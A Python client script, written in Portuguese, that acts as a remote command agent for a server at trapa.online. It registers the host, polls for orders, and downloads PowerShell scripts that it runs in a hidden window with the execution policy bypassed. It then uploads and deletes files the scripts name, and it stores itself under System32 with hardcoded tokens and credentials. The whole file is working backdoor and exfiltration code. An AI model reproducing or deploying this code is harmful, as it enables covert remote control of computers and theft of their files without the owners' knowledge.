import time
import subprocess
import requests
import socket
import json
from pathlib import Path
import uuid
import urllib3

# Desativa avisos de SSL inseguro gerados pelo requests quando verify=False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


PASTA_SCRIPTS = Path(r"C:\Windows\System32\ap32\Res-PE")
PASTA_DOWNLOADS = Path(r"C:\Windows\System32\ap32\Res-PE")
FICHEIRO_RESULTADOS_PENDENTES = Path(r"C:\Windows\System32\ap32\resultados_pendentes.json")
CLIENT_ID_FILE = Path(r"C:\Windows\System32\ap32\id.txt")


SERVIDOR = "https://trapa.online:5000"
REPO_BASE_URL = "https://trapa.online/repo"
CLIENT_NOME = socket.gethostname() 
TOKEN = "1739951c204b93b300cc0aef4bb831fba87ba4eb0dbb68b9c62d3746f4a8bdcd"

DOWNLOAD_USER = "hy6LKzfyyiGcUFbT0s5W0X6j6Qy6LKzfyyiG0CBimV44XYqVCGAl" 
DOWNLOAD_PASS = "i$p~65lfm7Wi},w2kFbT0s5W0X6j6Q0CBimp^i/'M8?+X=yZS*Er8" 

INTERVALO = 2


SCRIPT_DIR = Path(__file__).parent.resolve()
NOME_CERT_SERVIDOR = "cert.pem" 
CAMINHO_CERT = SCRIPT_DIR / NOME_CERT_SERVIDOR


SSL_VERIFY_PATH = str(CAMINHO_CERT) if CAMINHO_CERT.exists() else True

def obter_client_id():
    if CLIENT_ID_FILE.exists():
        return CLIENT_ID_FILE.read_text(encoding="utf-8").strip()
    client_id = str(uuid.uuid4())
    CLIENT_ID_FILE.write_text(client_id, encoding="utf-8")
    return client_id

CLIENT_ID = obter_client_id()


def listar_scripts():
    scripts = {}
    if not PASTA_SCRIPTS.exists():
        return scripts
    for item in PASTA_SCRIPTS.iterdir():
        if item.is_file():
            scripts[item.stem.lower()] = str(item)
    return scripts


def registar_cliente():
    try:
        resposta = requests.post(
            f"{SERVIDOR}/registar",
            json={"client_id": CLIENT_ID, "nome": CLIENT_NOME},
            headers={"Authorization": f"Bearer {TOKEN}"},
            verify=SSL_VERIFY_PATH,
            timeout=15
        )
        resposta.raise_for_status()
        return True
    except requests.exceptions.SSLError as e:
        print(f"[ERRO SSL] Certificado inválido: {e}")
        return False
    except requests.exceptions.RequestException:
        return False


def extrair_uploads(texto):
    ficheiros = []
    for linha in texto.splitlines():
        linha = linha.strip()
        if linha.upper().startswith("UPLOAD:"):
            caminho = linha[7:].strip()
            if caminho:
                ficheiros.append(caminho)
    return ficheiros


def baixar_script(nome_script):
    PASTA_DOWNLOADS.mkdir(parents=True, exist_ok=True)
    nome_script = Path(nome_script).name

    if not nome_script.lower().endswith(".ps1"):
        nome_script += ".ps1"

    url_download = f"{REPO_BASE_URL}/{nome_script}"

    try:
        resposta = requests.get(
            url_download,
            timeout=30,
            verify=False,                     # ❌ Ignora verificação de certificados
            auth=(DOWNLOAD_USER, DOWNLOAD_PASS) # 🔑 Autenticação Basic (user:password)
        )

        if resposta.status_code == 200:
            caminho_destino = PASTA_DOWNLOADS / nome_script
            with open(caminho_destino, "wb") as f:
                f.write(resposta.content)
            print(f"[INFO] Script descarregado como '{nome_script}'")
            return str(caminho_destino)

        elif resposta.status_code == 404:
            print(f"[WARN] Script '{nome_script}' não encontrado no repositório.")
            return None
        else:
            print(f"[ERROR] HTTP {resposta.status_code}: {resposta.text[:200]}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Falha de rede: {e}")
        return None
    except Exception as e:
        print(f"[ERROR] Erro inesperado: {e}")
        return None


def executar_script(nome):
    caminho_baixado = baixar_script(nome)
    if not caminho_baixado:
        return False, f"Erro ao baixar o script '{nome}'.", []

    try:
        resultado = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", caminho_baixado],
            capture_output=True, text=True, timeout=600
        )

        stdout = resultado.stdout.strip()
        stderr = resultado.stderr.strip()
        ficheiros_para_enviar = extrair_uploads(stdout)

        try:
            Path(caminho_baixado).unlink(missing_ok=True)
            print(f"[INFO] Script removido de {caminho_baixado}")
        except Exception:
            pass

        if stderr:
            return False, stderr, ficheiros_para_enviar
        return True, stdout if stdout else "Script executado com sucesso.", ficheiros_para_enviar

    except subprocess.TimeoutExpired:
        try: Path(caminho_baixado).unlink(missing_ok=True)
        except Exception: pass
        return False, "Tempo limite de execução excedido (10 min).", []
    except Exception as e:
        return False, str(e), []


def pedir_ordem():
    try:
        resposta = requests.get(
            f"{SERVIDOR}/ordem/{CLIENT_ID}", 
            headers={"Authorization": f"Bearer {TOKEN}"}, 
            verify=SSL_VERIFY_PATH, 
            timeout=15
        )
        if resposta.status_code == 204:
            return None
        resposta.raise_for_status()
        return resposta.json()
    except requests.exceptions.SSLError as e:
        print(f"[ERRO SSL] {e}")
        return None
    except requests.exceptions.RequestException:
        return None


def enviar_resultado(ordem_id, sucesso, resultado):
    payload = {"client_id": CLIENT_ID, "ordem_id": ordem_id, "sucesso": sucesso, "resultado": resultado}
    try:
        resposta = requests.post(
            f"{SERVIDOR}/resultado", 
            json=payload, 
            headers={"Authorization": f"Bearer {TOKEN}"}, 
            verify=SSL_VERIFY_PATH,
            timeout=15
        )
        resposta.raise_for_status()
        return True
    except requests.exceptions.RequestException:
        guardar_resultado_pendente(payload)
        return False


def enviar_ficheiro(caminho_ficheiro, ordem_id="", descricao=""):
    caminho = Path(caminho_ficheiro)
    if not caminho.exists() or not caminho.is_file():
        print(f"Ficheiro não encontrado: {caminho}")
        return False

    try:
        with open(caminho, "rb") as f:
            resposta = requests.post(
                f"{SERVIDOR}/upload",
                headers={"Authorization": f"Bearer {TOKEN}"},
                data={"client_id": CLIENT_ID, "ordem_id": ordem_id, "descricao": descricao},
                files={"ficheiro": (caminho.name, f)},
                verify=SSL_VERIFY_PATH, 
                timeout=60
            )
        resposta.raise_for_status()

        try:
            caminho.unlink()
            print(f"Ficheiro enviado e apagado: {caminho}")
        except Exception as e:
            print(f"Upload feito, mas não foi possível apagar {caminho}: {e}")
        return True
    except requests.exceptions.SSLError as e:
        print(f"[ERRO SSL] Não foi possível enviar {caminho}: {e}")
        return False
    except requests.exceptions.RequestException:
        print(f"Servidor indisponível. Não foi possível enviar: {caminho}")
        return False
    except Exception as e:
        print(f"Erro ao enviar ficheiro {caminho}: {e}")
        return False


def carregar_resultados_pendentes():
    if not FICHEIRO_RESULTADOS_PENDENTES.exists():
        return []
    try:
        with open(FICHEIRO_RESULTADOS_PENDENTES, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []


def guardar_todos_resultados_pendentes(lista):
    try:
        with open(FICHEIRO_RESULTADOS_PENDENTES, "w", encoding="utf-8") as f:
            json.dump(lista, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Erro ao guardar resultados pendentes: {e}")


def guardar_resultado_pendente(payload):
    pendentes = carregar_resultados_pendentes()
    pendentes.append(payload)
    guardar_todos_resultados_pendentes(pendentes)


def reenviar_resultados_pendentes():
    pendentes = carregar_resultados_pendentes()
    if not pendentes:
        return

    ainda_pendentes = []
    for payload in pendentes:
        try:
            resposta = requests.post(
                f"{SERVIDOR}/resultado", 
                json=payload, 
                headers={"Authorization": f"Bearer {TOKEN}"}, 
                verify=SSL_VERIFY_PATH,
                timeout=15
            )
            resposta.raise_for_status()
        except requests.exceptions.RequestException:
            ainda_pendentes.append(payload)

    guardar_todos_resultados_pendentes(ainda_pendentes)


def main():
    print("Cliente iniciado. A aguardar ordens do servidor...")
    if SSL_VERIFY_PATH is True:
        print("[INFO] A usar certificados de sistema para verificar o servidor.")
    else:
        print(f"[INFO] A verificar certificado do servidor em: {SSL_VERIFY_PATH}")

    while True:
        try:
            registar_cliente()
            reenviar_resultados_pendentes()

            ordem = pedir_ordem()
            if ordem:
                ordem_id = ordem.get("id")
                script = ordem.get("script")

                if not ordem_id or not script:
                    time.sleep(INTERVALO)
                    continue

                print(f"\n[ORDEM RECEBIDA] Executando {ordem_id}: {script}")
                sucesso, resultado, ficheiros_para_enviar = executar_script(script)
                enviar_resultado(ordem_id, sucesso, resultado)

                for ficheiro in ficheiros_para_enviar:
                    enviar_ficheiro(ficheiro, ordem_id=ordem_id, descricao=f"Ficheiro enviado pelo script {script}")

        except Exception as e:
            print(f"\n[ERRO GERAL] {e}")

        time.sleep(INTERVALO)


if __name__ == "__main__":
    main()
